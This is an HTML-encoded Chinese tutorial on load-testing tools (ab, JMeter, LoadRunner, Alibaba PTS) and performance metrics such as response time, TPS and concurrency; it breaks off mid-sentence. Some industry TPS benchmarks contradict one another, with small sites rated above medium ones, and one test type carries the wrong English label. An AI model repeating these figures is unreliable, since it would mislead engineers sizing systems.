Apache&#x670D;&#x52A1;&#x5668;&#x81EA;&#x5E26;&#x7684;&#x4E00;&#x4E2A;web&#x538B;&#x529B;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;&#xFF0C;&#x7B80;&#x79F0;ab&#x3002;ab&#x53C8;&#x662F;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;&#xFF0C;&#x5BF9;&#x53D1;&#x8D77;&#x8D1F;&#x8F7D;&#x7684;&#x672C;&#x673A;&#x8981;&#x6C42;&#x5F88;&#x4F4E;&#xFF0C;&#x6839;&#x636E;ab&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x5F88;&#x591A;&#x7684;&#x5E76;&#x53D1;&#x8BBF;&#x95EE;&#x7EBF;&#x7A0B;&#xFF0C;&#x6A21;&#x62DF;&#x591A;&#x4E2A;&#x8BBF;&#x95EE;&#x8005;&#x540C;&#x65F6;&#x5BF9;&#x67D0;&#x4E00;URL&#x5730;&#x5740;&#x8FDB;&#x884C;&#x8BBF;&#x95EE;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6D4B;&#x8BD5;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D1F;&#x8F7D;&#x538B;&#x529B;&#x3002;&#x603B;&#x7684;&#x6765;&#x8BF4;ab&#x5DE5;&#x5177;&#x5C0F;&#x5DE7;&#x7B80;&#x5355;&#x3001;&#x975E;&#x5E38;&#x8F7B;&#x91CF;&#x5316;&#x7684;&#x538B;&#x6D4B;&#x5DE5;&#x5177;&#xFF0C;&#x4E0A;&#x624B;&#x5B66;&#x4E60;&#x8F83;&#x5FEB;&#xFF0C;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;&#x9700;&#x8981;&#x7684;&#x57FA;&#x672C;&#x6027;&#x80FD;&#x6307;&#x6807;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x56FE;&#x5F62;&#x5316;&#x7ED3;&#x679C;&#xFF0C;&#x4E0D;&#x80FD;&#x76D1;&#x63A7;&#x3002;</p><p>Jmeter&#xFF1A;Apache JMeter&#x662F;Apache&#x7EC4;&#x7EC7;&#x5F00;&#x53D1;&#x7684;&#x57FA;&#x4E8E;Java&#x7684;&#x538B;&#x529B;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;&#x3002;&#x7528;&#x4E8E;&#x5BF9;&#x8F6F;&#x4EF6;&#x505A;&#x538B;&#x529B;&#x6D4B;&#x8BD5;&#xFF0C;&#x5B83;&#x6700;&#x521D;&#x88AB;&#x8BBE;&#x8BA1;&#x7528;&#x4E8E;Web&#x5E94;&#x7528;&#x6D4B;&#x8BD5;&#xFF0C;&#x4F46;&#x540E;&#x6765;&#x6269;&#x5C55;&#x5230;&#x5176;&#x4ED6;&#x6D4B;&#x8BD5;&#x9886;&#x57DF;&#x3002;JMeter&#x80FD;&#x591F;&#x5BF9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x505A;&#x529F;&#x80FD;/&#x56DE;&#x5F52;&#x6D4B;&#x8BD5;&#xFF0C;&#x901A;&#x8FC7;&#x521B;&#x5EFA;&#x5E26;&#x6709;&#x65AD;&#x8A00;&#x7684;&#x811A;&#x672C;&#x6765;&#x9A8C;&#x8BC1;&#x4F60;&#x7684;&#x7A0B;&#x5E8F;&#x8FD4;&#x56DE;&#x4E86;&#x4F60;&#x671F;&#x671B;&#x7684;&#x7ED3;&#x679C;&#x3002;</p><p>LoadRunner&#xFF1A;LR&#x662F;HP&#x63A8;&#x51FA;&#x7684;&#x4E00;&#x79CD;&#x9884;&#x6D4B;&#x7CFB;&#x7EDF;&#x884C;&#x4E3A;&#x548C;&#x6027;&#x80FD;&#x7684;&#x8D1F;&#x8F7D;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;&#xFF0C;&#x901A;&#x8FC7;&#x4EE5;&#x6A21;&#x62DF;&#x4E0A;&#x5343;&#x4E07;&#x7528;&#x6237;&#x5B9E;&#x65BD;&#x5E76;&#x53D1;&#x8D1F;&#x8F7D;&#x53CA;&#x5B9E;&#x65F6;&#x6027;&#x80FD;&#x76D1;&#x6D4B;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x786E;&#x8BA4;&#x548C;&#x67E5;&#x627E;&#x95EE;&#x9898;&#xFF0C;&#x5206;&#x4E3A;Windows &#x7248;&#x672C;&#x548C;Unix &#x7248;&#x672C;&#x3002;LoadRunner&#x80FD;&#x591F;&#x5BF9;&#x6574;&#x4E2A;&#x4F01;&#x4E1A;&#x67B6;&#x6784;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#x3002;&#x4F01;&#x4E1A;&#x4E5F;&#x80FD;&#x6700;&#x5927;&#x9650;&#x5EA6;&#x5730;&#x7F29;&#x77ED;&#x6D4B;&#x8BD5;&#x65F6;&#x95F4;&#xFF0C;&#x4F18;&#x5316;&#x6027;&#x80FD;&#x548C;&#x52A0;&#x901F;&#x5E94;&#x7528;&#x7CFB;&#x7EDF;&#x7684;&#x53D1;&#x5E03;&#x5468;&#x671F;&#x3002;&#x4E5F;&#x80FD;&#x9884;&#x6D4B;&#x7CFB;&#x7EDF;&#x884C;&#x4E3A;&#x5E76;&#x4F18;&#x5316;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x3002;&#x5546;&#x4E1A;&#x7248;&#x652F;&#x6301;&#x5F55;&#x5C4F;+&#x811A;&#x672C;&#x7684;&#x65B9;&#x5F0F;&#x3002;</p><p>&#x963F;&#x91CC;&#x4E91;PTS&#xFF1A;PTS&#xFF08;Performance Testing Service&#xFF09;&#x662F;&#x9762;&#x5411;&#x6240;&#x6709;&#x6280;&#x672F;&#x80CC;&#x666F;&#x4EBA;&#x5458;&#x7684;&#x4E91;&#x5316;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;&#x3002;&#x6709;&#x522B;&#x4E8E;&#x4F20;&#x7EDF;&#x5DE5;&#x5177;&#x7684;&#x7E41;&#x590D;&#xFF0C;PTS&#x4EE5;&#x4E92;&#x8054;&#x7F51;&#x5316;&#x7684;&#x4EA4;&#x4E92;&#xFF0C;&#x63D0;&#x4F9B;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x3001;API&#x8C03;&#x8BD5;&#x548C;&#x76D1;&#x6D4B;&#x7B49;&#x591A;&#x79CD;&#x80FD;&#x529B;&#x3002;&#x81EA;&#x7814;&#x548C;&#x9002;&#x914D;&#x5F00;&#x6E90;&#x7684;&#x529F;&#x80FD;&#x90FD;&#x53EF;&#x4EE5;&#x8F7B;&#x677E;&#x6A21;&#x62DF;&#x4EFB;&#x610F;&#x4F53;&#x91CF;&#x7684;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x4E1A;&#x52A1;&#x7684;&#x573A;&#x666F;&#xFF0C;&#x4EFB;&#x52A1;&#x968F;&#x65F6;&#x53D1;&#x8D77;&#xFF0C;&#x514D;&#x53BB;&#x7E41;&#x7410;&#x7684;&#x642D;&#x5EFA;&#x548C;&#x7EF4;&#x62A4;&#x6210;&#x672C;&#x3002;&#x66F4;&#x662F;&#x7D27;&#x5BC6;&#x7ED3;&#x5408;&#x76D1;&#x63A7;&#x3001;&#x6D41;&#x63A7;&#x7B49;&#x5144;&#x5F1F;&#x4EA7;&#x54C1;&#x63D0;&#x4F9B;&#x4E00;&#x7AD9;&#x5F0F;&#x9AD8;&#x53EF;&#x7528;&#x80FD;&#x529B;&#xFF0C;&#x9AD8;&#x6548;&#x68C0;&#x9A8C;&#x548C;&#x7BA1;&#x7406;&#x4E1A;&#x52A1;&#x6027;&#x80FD;&#x3002;&#x5F53;&#x7136;&#x4E5F;&#x53EF;&#x4EE5;&#x6A21;&#x62DF;&#x9ED1;&#x5BA2;&#x5BF9;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x8FDB;&#x884C;&#x5168;&#x9762;&#x6DF1;&#x5165;&#x7684;&#x5B89;&#x5168;&#x6D4B;&#x8BD5;&#xFF0C;</p><ol start="2"><li>&#x5E38;&#x7528;&#x5DE5;&#x5177;&#x5BF9;&#x6BD4;</li></ol><table><thead><tr><th>&#x5BF9;&#x6BD4;&#x9879;\&#x538B;&#x6D4B;&#x5DE5;&#x5177;</th><th>Apache Bench&#xFF08;ab&#xFF09;</th><th>JMeter</th><th>LoadRunner</th><th>PTS</th></tr></thead><tbody><tr><td>&#x5B66;&#x4E60;&#x6210;&#x672C;</td><td>&#x4F4E;</td><td>&#x9AD8;</td><td>&#x9AD8;</td><td>&#x4F4E;</td></tr><tr><td>&#x5B89;&#x88C5;&#x90E8;&#x7F72;&#x6210;&#x672C;</td><td>&#x4F4E;</td><td>&#x9AD8;</td><td>&#x9AD8;</td><td>&#x4F4E;</td></tr><tr><td>&#x8D39;&#x7528;</td><td>&#x65E0;</td><td>&#x65E0;</td><td>&#x6709;</td><td>&#x6709;</td></tr><tr><td>&#x591A;&#x534F;&#x8BAE;</td><td>&#x5426;</td><td>&#x662F;</td><td>&#x662F;</td><td>&#x662F;</td></tr><tr><td>&#x56FE;&#x5F62;&#x5316;&#x5C55;&#x793A;</td><td>&#x5426;</td><td>&#x662F;</td><td>&#x662F;</td><td>&#x662F;</td></tr><tr><td>TPS&#x6A21;&#x5F0F;</td><td>&#x5426;</td><td>&#x5426;</td><td>&#x5426;</td><td>&#x662F;</td></tr><tr><td>&#x538B;&#x6D4B;&#x94FE;&#x8DEF;&#x3001;&#x573A;&#x666F;&#x7F16;&#x6392;&#x7BA1;&#x7406;</td><td>&#x5426;</td><td>&#x662F;</td><td>&#x662F;</td><td>&#x662F;</td></tr><tr><td>&#x573A;&#x666F;&#x5F55;&#x5236;</td><td>&#x5426;</td><td>&#x662F;</td><td>&#x662F;</td><td>&#x662F;</td></tr><tr><td>&#x751F;&#x6001;&#x73AF;&#x5883;&#x5F3A;&#x5F31;</td><td>&#x5F31;</td><td>&#x5F31;</td><td>&#x5F31;</td><td>&#x5F3A;</td></tr><tr><td>&#x76D1;&#x63A7;&#x6307;&#x6807;&#x662F;&#x5426;&#x5B8C;&#x5907;</td><td>&#x5426;</td><td>&#x5426;</td><td>&#x5426;</td><td>&#x662F;</td></tr><tr><td>&#x6D41;&#x91CF;&#x5730;&#x57DF;&#x5B9A;&#x5236;</td><td>&#x5426;</td><td>&#x5426;</td><td>&#x5426;</td><td>&#x662F;</td></tr></tbody></table><ol start="3"><li>&#x538B;&#x6D4B;&#x6807;&#x51C6;</li></ol><table><thead><tr><th>&#x538B;&#x6D4B;&#x7C7B;&#x578B;</th><th>&#x89E3;&#x91CA;&#x8BF4;&#x660E;</th></tr></thead><tbody><tr><td>&#x538B;&#x529B;&#x6D4B;&#x8BD5;(Stress Testing)</td><td>&#x4E5F;&#x79F0;&#x4E4B;&#x4E3A;&#x5F3A;&#x5EA6;&#x6D4B;&#x8BD5;&#xFF0C;&#x6D4B;&#x8BD5;&#x4E00;&#x4E2A;&#x7CFB;&#x7EDF;&#x7684;&#x6700;&#x5927;&#x6297;&#x538B;&#x80FD;&#x529B;&#xFF0C;&#x5728;&#x5F3A;&#x8D1F;&#x8F7D;(&#x5927;&#x6570;&#x636E;&#x3001;&#x9AD8;&#x5E76;&#x53D1;)&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6D4B;&#x8BD5;&#x7CFB;&#x7EDF;&#x6240;&#x80FD;&#x627F;&#x53D7;&#x7684;&#x6700;&#x5927;&#x538B;&#x529B;&#xFF0C;&#x9884;&#x4F30;&#x7CFB;&#x7EDF;&#x7684;&#x74F6;&#x9888;</td></tr><tr><td>&#x5E76;&#x53D1;&#x6D4B;&#x8BD5;(Concurrency Testing)</td><td>&#x901A;&#x8FC7;&#x6A21;&#x62DF;&#x5F88;&#x591A;&#x7528;&#x6237;&#x540C;&#x4E00;&#x65F6;&#x523B;&#x8BBF;&#x95EE;&#x7CFB;&#x7EDF;&#x6216;&#x5BF9;&#x7CFB;&#x7EDF;&#x67D0;&#x4E00;&#x4E2A;&#x529F;&#x80FD;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;&#x6765;&#x6D4B;&#x8BD5;&#x7CFB;&#x7EDF;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x4ECE;&#x4E2D;&#x53D1;&#x73B0;&#x95EE;&#x9898;(&#x5E76;&#x53D1;&#x8BFB;&#x5199;&#x3001;&#x7EBF;&#x7A0B;&#x63A7;&#x5236;&#x3001;&#x8D44;&#x6E90;&#x4E89;&#x62A2;)</td></tr><tr><td>&#x8010;&#x4E45;&#x6027;&#x6D4B;&#x8BD5;(Configuration Testing)</td><td>&#x901A;&#x8FC7;&#x5BF9;&#x7CFB;&#x7EDF;&#x5728;&#x5927;&#x8D1F;&#x8377;&#x7684;&#x6761;&#x4EF6;&#x4E0B;&#x957F;&#x65F6;&#x95F4;&#x8FD0;&#x884C;&#xFF0C;&#x6D4B;&#x8BD5;&#x7CFB;&#x7EDF;&#x3001;&#x673A;&#x5668;&#x7684;&#x957F;&#x65F6;&#x95F4;&#x8FD0;&#x884C;&#x4E0B;&#x7684;&#x72B6;&#x51B5;,&#x4ECE;&#x4E2D;&#x53D1;&#x73B0;&#x95EE;&#x9898;(&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x3001;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x6C60;&#x4E0D;&#x91CA;&#x653E;&#x3001;&#x8D44;&#x6E90;&#x4E0D;&#x56DE;&#x6536;)</td></tr></tbody></table><p>&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6307;&#x6807;</p><p>3.1 &#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;  </p><blockquote><p>&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x6307;&#x7528;&#x6237;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x8D77;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x5F00;&#x59CB;&#xFF0C;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x63A5;&#x6536;&#x5230;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x8FD4;&#x56DE;&#x7684;&#x54CD;&#x5E94;&#x7ED3;&#x675F;&#xFF0C;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x6240;&#x8017;&#x8D39;&#x7684;&#x65F6;&#x95F4;&#x3002;&#x5728;&#x6027;&#x80FD;&#x68C0;&#x6D4B;&#x4E2D;&#x4E00;&#x822C;&#x4EE5;&#x538B;&#x529B;&#x53D1;&#x8D77;&#x7AEF;&#x81F3;&#x88AB;&#x538B;&#x6D4B;&#x670D;&#x52A1;&#x5668;&#x8FD4;&#x56DE;&#x5904;&#x7406;&#x7ED3;&#x679C;&#x7684;&#x65F6;&#x95F4;&#x4E3A;&#x8BA1;&#x91CF;&#xFF0C;&#x5355;&#x4F4D;&#x4E00;&#x822C;&#x4E3A;&#x79D2;&#x6216;&#x6BEB;&#x79D2;&#x3002;&#x5E73;&#x5747;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x6307;&#x7CFB;&#x7EDF;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x6BB5;&#x5185;&#xFF0C;&#x540C;&#x4E00;&#x4EA4;&#x6613;&#x7684;&#x5E73;&#x5747;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3002;&#x4E00;&#x822C;&#x800C;&#x8A00;&#xFF0C;&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x5747;&#x6307;&#x5E73;&#x5747;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3002; &#x5E73;&#x5747;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x6307;&#x6807;&#x503C;&#x5E94;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x7684;&#x4EA4;&#x6613;&#x5206;&#x522B;&#x8BBE;&#x5B9A;&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5206;&#x4E3A;&#x590D;&#x6742;&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3001;&#x7B80;&#x5355;&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3001;&#x7279;&#x6B8A;&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3002;&#x5176;&#x4E2D;&#xFF0C;&#x7279;&#x6B8A;&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x7684;&#x8BBE;&#x5B9A;&#x5FC5;&#x987B;&#x660E;&#x786E;&#x8BE5;&#x4EA4;&#x6613;&#x5728;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x65B9;&#x9762;&#x7684;&#x7279;&#x6B8A;&#x6027;&#x3002;</p></blockquote><p>Response Time: &#x7B80;&#x79F0;RT</p><blockquote><p>&#x4E0D;&#x540C;&#x884C;&#x4E1A;&#x4E0D;&#x540C;&#x4E1A;&#x52A1;&#x53EF;&#x63A5;&#x53D7;&#x7684;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x662F;&#x4E0D;&#x540C;&#x7684;&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#xFF0C;&#x5BF9;&#x4E8E;&#x5728;&#x7EBF;&#x5B9E;&#x65F6;&#x4EA4;&#x6613;&#xFF1A;<br>&#x4E92;&#x8054;&#x7F51;&#x4F01;&#x4E1A;&#xFF1A;500&#x6BEB;&#x79D2;&#x4EE5;&#x4E0B;&#xFF0C;&#x4F8B;&#x5982;&#x6DD8;&#x5B9D;&#x4E1A;&#x52A1;10&#x6BEB;&#x79D2;&#x5DE6;&#x53F3;&#x3002;<br>&#x91D1;&#x878D;&#x4F01;&#x4E1A;&#xFF1A;1&#x79D2;&#x4EE5;&#x4E0B;&#x4E3A;&#x4F73;&#xFF0C;&#x90E8;&#x5206;&#x590D;&#x6742;&#x4E1A;&#x52A1;3&#x79D2;&#x4EE5;&#x4E0B;&#x3002;<br>&#x4FDD;&#x9669;&#x4F01;&#x4E1A;&#xFF1A;3&#x79D2;&#x4EE5;&#x4E0B;&#x4E3A;&#x4F73;&#x3002;<br>&#x5236;&#x9020;&#x4E1A;&#xFF1A;5&#x79D2;&#x4EE5;&#x4E0B;&#x4E3A;&#x4F73;&#x3002;</p></blockquote><p>&#x5BF9;&#x4E8E;&#x6279;&#x91CF;&#x4EA4;&#x6613;&#xFF1A;</p><blockquote><p>&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#xFF1A;&#x5373;&#x6574;&#x4E2A;&#x538B;&#x6D4B;&#x8FC7;&#x7A0B;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x4E0D;&#x540C;&#x6570;&#x636E;&#x91CF;&#x5219;&#x65F6;&#x95F4;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x4F8B;&#x5982;&#x53CC;11&#x548C;99&#x5927;&#x4FC3;&#xFF0C;&#x6570;&#x636E;&#x91CF;&#x7EA7;&#x4E0D;&#x4E00;&#x6837;&#x5219;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#x4E0D;&#x540C;&#x3002;&#x5927;&#x6570;&#x636E;&#x91CF;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;2&#x5C0F;&#x65F6;&#x5185;&#x53EF;&#x5B8C;&#x6210;&#x538B;&#x6D4B;&#x3002;</p></blockquote><p>3.2 &#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;</p><blockquote><p>&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x662F;&#x6307;&#x7CFB;&#x7EDF;&#x5728;&#x5229;&#x7528;&#x7CFB;&#x7EDF;&#x786C;&#x4EF6;&#x5E73;&#x53F0;&#x548C;&#x8F6F;&#x4EF6;&#x5E73;&#x53F0;&#x8FDB;&#x884C;&#x4FE1;&#x606F;&#x5904;&#x7406;&#x7684;&#x80FD;&#x529B;&#x3002; &#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x901A;&#x8FC7;&#x7CFB;&#x7EDF;&#x6BCF;&#x79D2;&#x949F;&#x80FD;&#x591F;&#x5904;&#x7406;&#x7684;&#x4EA4;&#x6613;&#x6570;&#x91CF;&#x6765;&#x8BC4;&#x4EF7;&#xFF0C;&#x4EA4;&#x6613;&#x6709;&#x4E24;&#x79CD;&#x7406;&#x89E3;&#xFF1A;&#x4E00;&#x662F;&#x4E1A;&#x52A1;&#x4EBA;&#x5458;&#x89D2;&#x5EA6;&#x7684;&#x4E00;&#x7B14;&#x4E1A;&#x52A1;&#x8FC7;&#x7A0B;&#xFF1B;&#x4E8C;&#x662F;&#x7CFB;&#x7EDF;&#x89D2;&#x5EA6;&#x7684;&#x4E00;&#x6B21;&#x4EA4;&#x6613;&#x7533;&#x8BF7;&#x548C;&#x54CD;&#x5E94;&#x8FC7;&#x7A0B;&#x3002;&#x524D;&#x8005;&#x79F0;&#x4E3A;&#x4E1A;&#x52A1;&#x4EA4;&#x6613;&#x8FC7;&#x7A0B;&#xFF0C;&#x540E;&#x8005;&#x79F0;&#x4E3A;&#x4E8B;&#x52A1;&#x3002;&#x4E24;&#x79CD;&#x4EA4;&#x6613;&#x6307;&#x6807;&#x90FD;&#x53EF;&#x4EE5;&#x8BC4;&#x4EF7;&#x5E94;&#x7528;&#x7CFB;&#x7EDF;&#x7684;&#x5904;&#x7406;&#x80FD;&#x529B;&#x3002;&#x4E00;&#x822C;&#x7684;&#x5EFA;&#x8BAE;&#x4E0E;&#x7CFB;&#x7EDF;&#x4EA4;&#x6613;&#x65E5;&#x5FD7;&#x4FDD;&#x6301;&#x4E00;&#x81F4;&#xFF0C;&#x4EE5;&#x4FBF;&#x4E8E;&#x7EDF;&#x8BA1;&#x4E1A;&#x52A1;&#x91CF;&#x6216;&#x8005;&#x4EA4;&#x6613;&#x91CF;&#x3002;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x6307;&#x6807;&#x662F;&#x6280;&#x672F;&#x6D4B;&#x8BD5;&#x6D3B;&#x52A8;&#x4E2D;&#x91CD;&#x8981;&#x6307;&#x6807;&#x3002;</p></blockquote><p>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7528;&#x4EE5;&#x4E0B;&#x6307;&#x6807;&#x6765;&#x5EA6;&#x91CF;&#xFF1A;</p><blockquote><p>HPS&#xFF08;Hits Per Second&#xFF09; &#xFF1A;&#x6BCF;&#x79D2;&#x70B9;&#x51FB;&#x6B21;&#x6570;&#xFF0C;&#x5355;&#x4F4D;&#x662F;&#x6B21;/&#x79D2;&#x3002;<br>TPS&#xFF08;Transaction per Second&#xFF09;&#xFF1A;&#x7CFB;&#x7EDF;&#x6BCF;&#x79D2;&#x5904;&#x7406;&#x4EA4;&#x6613;&#x6570;&#xFF0C;&#x5355;&#x4F4D;&#x662F;&#x7B14;/&#x79D2;&#x3002;<br>QPS&#xFF08;Query per Second&#xFF09;&#xFF1A;&#x7CFB;&#x7EDF;&#x6BCF;&#x79D2;&#x5904;&#x7406;&#x67E5;&#x8BE2;&#x6B21;&#x6570;&#xFF0C;&#x5355;&#x4F4D;&#x662F;&#x6B21;/&#x79D2;&#x3002; &#x5BF9;&#x4E8E;&#x4E92;&#x8054;&#x7F51;&#x4E1A;&#x52A1;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x67D0;&#x4E9B;&#x4E1A;&#x52A1;&#x6709;&#x4E14;&#x4EC5;&#x6709;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x8FDE;&#x63A5;&#xFF0C;&#x90A3;&#x4E48;TPS=QPS=HPS&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x7528;TPS&#x6765;&#x8861;&#x91CF;&#x6574;&#x4E2A;&#x4E1A;&#x52A1;&#x6D41;&#x7A0B;&#xFF0C;&#x7528;QPS&#x6765;&#x8861;&#x91CF;&#x63A5;&#x53E3;&#x67E5;&#x8BE2;&#x6B21;&#x6570;&#xFF0C;&#x7528;HPS&#x6765;&#x8868;&#x793A;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x5355;&#x51FB;&#x8BF7;&#x6C42;&#x3002;  </p></blockquote><p>&#x6807;&#x51C6;</p><blockquote><p>&#x65E0;&#x8BBA;TPS&#x3001;QPS&#x3001;HPS&#xFF0C;&#x6B64;&#x6307;&#x6807;&#x662F;&#x8861;&#x91CF;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x7684;&#x6307;&#x6807;&#xFF0C;&#x8D8A;&#x5927;&#x8D8A;&#x597D;&#xFF0C;&#x6839;&#x636E;&#x7ECF;&#x9A8C;&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF1A;<br>&#x91D1;&#x878D;&#x884C;&#x4E1A;&#xFF1A;1000 TPS&#x3002;<br>&#x4FDD;&#x9669;&#x884C;&#x4E1A;&#xFF1A;100000 TPS&#xFF0C;&#x4E0D;&#x5305;&#x62EC;&#x4E92;&#x8054;&#x7F51;&#x5316;&#x7684;&#x6D3B;&#x52A8;&#x3002;<br>&#x5236;&#x9020;&#x884C;&#x4E1A;&#xFF1A;10 TPS&#x3002;<br>&#x4E92;&#x8054;&#x7F51;&#x7535;&#x5B50;&#x5546;&#x52A1;&#xFF1A;1000000 TPS&#x3002;<br>&#x4E92;&#x8054;&#x7F51;&#x4E2D;&#x578B;&#x7F51;&#x7AD9;&#xFF1A;1000 TPS&#x3002;<br>&#x4E92;&#x8054;&#x7F51;&#x5C0F;&#x578B;&#x7F51;&#x7AD9;&#xFF1A;10000 TPS&#x3002;    </p></blockquote><p>3.3 &#x5E76;&#x53D1;&#x7528;&#x6237;</p><blockquote><p>&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x6307;&#x5728;&#x540C;&#x4E00;&#x65F6;&#x523B;&#x5185;&#xFF0C;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#x5E76;&#x8FDB;&#x884C;&#x4E1A;&#x52A1;&#x64CD;&#x4F5C;&#x7684;&#x7528;&#x6237;&#x6570;&#x91CF;&#x3002; &#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5BF9;&#x4E8E;&#x957F;&#x8FDE;&#x63A5;&#x7CFB;&#x7EDF;&#x6765;&#x8BF4;&#x6700;&#x5927;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5373;&#x662F;&#x7CFB;&#x7EDF;&#x7684;&#x5E76;&#x53D1;&#x63A5;&#x5165;&#x80FD;&#x529B;&#x3002;&#x5BF9;&#x4E8E;&#x77ED;&#x8FDE;&#x63A5;&#x7CFB;&#x7EDF;&#x800C;&#x8A00;&#x6700;&#x5927;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5E76;&#x4E0D;&#x7B49;&#x4E8E;&#x7CFB;&#x7EDF;&#x7684;&#x5E76;&#x53D1;&#x63A5;&#x5165;&#x80FD;&#x529B;&#xFF0C;&#x800C;&#x662F;&#x4E0E;&#x7CFB;&#x7EDF;&#x67B6;&#x6784;&#x3001;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x7B49;&#x5404;&#x79CD;&#x60C5;&#x51B5;&#x76F8;&#x5173;&#x3002;&#x4F8B;&#x5982;&#x7CFB;&#x7EDF;&#x541E;&#x5410;&#x80FD;&#x529B;&#x5F88;&#x5F3A;&#xFF0C;&#x52A0;&#x4E0A;&#x77ED;&#x8FDE;&#x63A5;&#x4E00;&#x822C;&#x90FD;&#x6709;&#x8FDE;&#x63A5;&#x590D;&#x7528;&#xFF0C;&#x5F80;&#x5F80;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5927;&#x4E8E;&#x7CFB;&#x7EDF;&#x7684;&#x5E76;&#x53D1;&#x63A5;&#x5165;&#x8FDE;&#x63A5;&#x6570;&#x3002;&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x5927;&#x90E8;&#x5206;&#x77ED;&#x8FDE;&#x63A5;&#x7C7B;&#x578B;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x541E;&#x5410;&#x91CF;&#x6A21;&#x5F0F;&#xFF08;RPS&#x6A21;&#x5F0F;&#xFF0C;Request Per Second&#xFF09;&#x6BD4;&#x8F83;&#x9002;&#x5408;&#xFF0C;&#x4E5F;&#x662F;&#x963F;&#x91CC;&#x7684;&#x6700;&#x4F73;&#x5B9E;&#x8DF5;&#xFF0C;PTS&#x652F;&#x6301;RPS&#x6A21;&#x5F0F;&#x7684;&#x538B;&#x6D4B;&#xFF0C;&#x541E;&#x5410;&#x91CF;&#x7684;&#x538B;&#x6D4B;&#x6784;&#x5EFA;&#x548C;&#x8861;&#x91CF;&#x4E00;&#x6B65;&#x5230;&#x4F4D;&#x3002; &#x5728;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x91C7;&#x7528;&#x865A;&#x62DF;&#x7528;&#x6237;&#x6765;&#x6A21;&#x62DF;&#x73B0;&#x5B9E;&#x4E2D;&#x7528;&#x6237;&#x8FDB;&#x884C;&#x4E1A;&#x52A1;&#x64CD;&#x4F5C;&#x3002;</p></blockquote><p>Virtual 